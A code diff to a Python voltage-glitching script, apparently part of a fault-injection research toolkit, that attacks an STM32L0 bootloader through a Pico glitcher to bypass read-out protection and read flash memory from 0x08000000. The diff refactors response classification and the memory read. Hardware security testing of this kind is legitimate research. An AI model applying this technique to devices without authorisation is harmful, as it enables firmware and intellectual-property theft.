@@ -1,3 +1,4 @@
+#!/usr/bin/env python3
 # Copyright (C) 2024 Dr. Matthias Kesenheimer - All Rights Reserved.
 # You may use, distribute and modify this code under the terms of the GPL3 license.
 #
@@ -10,7 +11,6 @@
 # > openocd -f interface/stlink.cfg -c "transport select hla_swd" -f target/stm32l0.cfg -c "init; halt; stm32l0x lock 0; sleep 2000; reset run; shutdown"
 # -> power cycle the target!
 
-#!/usr/bin/env python3
 import argparse
 import logging
 import random
@@ -19,21 +19,9 @@ import time
 
 # import custom libraries
 sys.path.insert(0, "../lib/")
-from BootloaderCom import BootloaderCom
+from BootloaderCom import BootloaderCom, GlitchState
+from GlitchState import OKType, ExpectedType
 from FaultInjectionLib import Database, PicoGlitcher, Helper
-
-# inherit functionality and overwrite some functions
-class DerivedGlitcher(PicoGlitcher):
-    def classify(self, expected, response):
-        if response == expected:
-            color = "G"
-        elif response >= 0:
-            color = "R"
-        elif response == -8:
-            color = "M"
-        else:
-            color = "Y"
-        return color
 
 class Main:
     def __init__(self, args):
@@ -41,7 +29,7 @@ class Main:
 
         logging.basicConfig(filename="execution.log", filemode="a", format="%(asctime)s %(message)s", level=logging.INFO, force=True)
 
-        self.glitcher = DerivedGlitcher()
+        self.glitcher = PicoGlitcher()
         self.glitcher.init(port=args.rpico)
 
         # we want to trigger on x11 with the configuration 8e1
@@ -70,7 +58,6 @@ class Main:
         s_delay = self.args.delay[0]
         e_delay = self.args.delay[1]
 
-        expected = -4
         experiment_id = 0
         while True:
             # set up glitch parameters (in nano seconds) and arm glitcher
@@ -84,20 +71,25 @@ class Main:
             time.sleep(0.01)
 
             # setup bootloader communication
-            response = self.bootcom.init_get_id()
+            self.bootcom.init_bootloader()
+            response = self.bootcom.setup_memread()
 
             # dump memory, this function triggers the glitch
-            if response == 0:
-                response = self.bootcom.dump_memory_to_file(self.dump_filename)
+            mem = b''
+            if issubclass(type(response), OKType):
+                #response = self.bootcom.dump_memory_to_file(self.dump_filename)
+                start = 0x08000000
+                size = 0xFF
+                response, mem = self.bootcom.read_memory(start, size)
 
             # block until glitch
             self.glitcher.block(timeout=2)
 
             # classify response
-            color = self.glitcher.classify(expected, response)
+            color = self.glitcher.classify(response)
 
             # add to database
-            response_str = str(response).encode("utf-8")
+            response_str = str(response).encode("utf-8") + mem
             self.database.insert(experiment_id, delay, length, color, response_str)
 
             # monitor
@@ -109,7 +101,7 @@ class Main:
             experiment_id += 1
 
             # exit if too many successive fails (including a supposedly successful memory read)
-            if response in (0, -1, -3, -5, -6, -7, -8) and self.response_before in (0, -1, -3, -5, -6, -7, -8):
+            if not issubclass(type(response), ExpectedType) and not issubclass(type(self.response_before), ExpectedType):
                 self.successive_fails += 1
             else:
                 self.successive_fails = 0
@@ -125,8 +117,8 @@ class Main:
                 break
             self.response_before = response
 
-            if response == 1:
-                # Dump finished
+            # Dump finished
+            if response == GlitchState.OK.dump_finished:
                 break
 
 if __name__ == "__main__":
